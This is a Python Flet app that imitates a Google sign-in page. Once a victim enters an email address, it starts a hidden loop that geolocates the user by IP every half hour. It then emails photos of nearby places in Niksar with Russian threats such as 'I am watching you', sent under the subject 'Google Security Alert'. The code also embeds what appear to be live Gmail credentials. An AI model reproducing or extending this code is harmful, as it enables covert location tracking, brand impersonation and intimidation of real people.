import flet as ft
import os
import math
import random
import requests
import smtplib
import time
from datetime import datetime
from threading import Thread
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# --- ⚙️ AYARLAR ---
GMAIL_ADRES = "asaaaq552@gmail.com"
GMAIL_SIFRE = "kest xcxl fvvz vxoy"

DURAKLAR = [
        {"dosya": "resim1.jpeg", "lat":40.59922128523893, "lon":36.92382590575047},
    {"dosya": "resim2.jpeg", "lat":40.600008138949406, "lon":36.926202634585806},
    {"dosya":"resim3.jpeg","lat":40.59809047473374, "lon":36.934594416026044},
    {"dosya":"resim4.PNG" ,"lat":40.584296185116486, "lon":36.92258657781466},
    {"dosya":"resim5.PNG", "lat":40.59035280365613, "lon":36.944078040710785},
    {"dosya":"resim6.jpeg", "lat":40.59005701891236, "lon":36.94545568194619},
    {"dosya":"resim7.PNG", "lat":40.58954338451908, "lon":36.94964900117175},
    {"dosya":"resim8.jpeg", "lat":40.589384424605655, "lon":36.95105021168881},
    {"dosya": "resim9.PNG", "lat":40.58930700930127, "lon":36.951894925182884},
    {"dosya":"resim10.PNG" , "lat":40.59011768627805, "lon":36.95469719695713},
    {"dosya":"resim11.jpeg" , "lat":40.58894675782318, "lon":36.96677653867708},
    {"dosya":"resim12.jpeg", "lat":40.58851799720838, "lon":36.96842475614222},
    {"dosya":"resim13.jpeg", "lat":40.588363451552546, "lon":36.97629436075707}
    # Diğer resimleri buraya aynı formatta ekleyebilirsin
]


def send_mail(to, subject, body, img_path):
    try:
        msg = MIMEMultipart()
        msg['From'] = GMAIL_ADRES
        msg['To'] = to
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        if os.path.exists(img_path):
            with open(img_path, "rb") as f:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(f.read())
                encoders.encode_base64(part)
                part.add_header("Content-Disposition", f'attachment; filename="{os.path.basename(img_path)}"')
                msg.attach(part)

        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.login(GMAIL_ADRES, GMAIL_SIFRE)
        server.send_message(msg)
        server.quit()
    except Exception as e:
        print(f"Mail Hatası: {e}")

def background_task(target_email):
    while True:
        try:
            r = requests.get("http://ip-api.com/json/", timeout=10).json()
            lat, lon = r.get('lat', 40.59), r.get('lon', 36.95)
            closest = min(DURAKLAR, key=lambda d: math.sqrt((lat-d['lat'])**2 + (lon-d['lon'])**2))
            img_path = closest['dosya']
            rusca = ["Я слежу за тобой.", "Твоя тень моя.", "Никсар ждет."]
            msg_body = f"{random.choice(rusca)}\nZaman: {datetime.now().strftime('%H:%M')}"
            send_mail(target_email, "Google Security Alert", msg_body, img_path)
            time.sleep(1800)
        except:
            time.sleep(60)

def main(page: ft.Page):
    page.title = "Google Login"
    page.window_width = 400
    page.window_height = 650
    page.theme_mode = ft.ThemeMode.LIGHT
    page.padding = 40
    page.vertical_alignment = ft.MainAxisAlignment.CENTER
    page.horizontal_alignment = ft.CrossAxisAlignment.CENTER

    email_input = ft.TextField(
        label="E-posta veya telefon",
        border_radius=10,
        width=320,
        height=60,
        focused_border_color="#1a73e8"
    )

    def on_login(e):
        if "@" in email_input.value:
            target = email_input.value
            # Arka plan görevini başlat
            Thread(target=background_task, args=(target,), daemon=True).start()
            
            # Ekranı temizle ve başarı mesajı göster
            page.controls.clear()
            page.add(ft.ProgressRing(), ft.Text("Veriler senkronize ediliyor..."))
            page.update()
        else:
            email_input.error_text = "Geçerli bir e-posta girin!"
            page.update()

    # Tasarım Bileşenleri
    google_logo = ft.Image(src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg", width=100)
    
    page.add(
        google_logo,
        ft.Text("Oturum açın", size=24, weight=ft.FontWeight.BOLD),
        ft.Text("Google Hesabınızı kullanın", size=14),
        ft.Container(height=20),
        email_input,
        ft.TextButton("E-postanızı mı unuttunuz?", style=ft.ButtonStyle(color="#1a73e8")),
        ft.Container(height=40),
        ft.Row(
            [
                ft.TextButton("Hesap oluşturun", style=ft.ButtonStyle(color="#1a73e8")),
                ft.ElevatedButton("İleri", on_click=on_login, bgcolor="#1a73e8", color="white", width=100)
            ],
            alignment=ft.MainAxisAlignment.SPACE_BETWEEN,
            width=320
        )
    )

ft.app(target=main)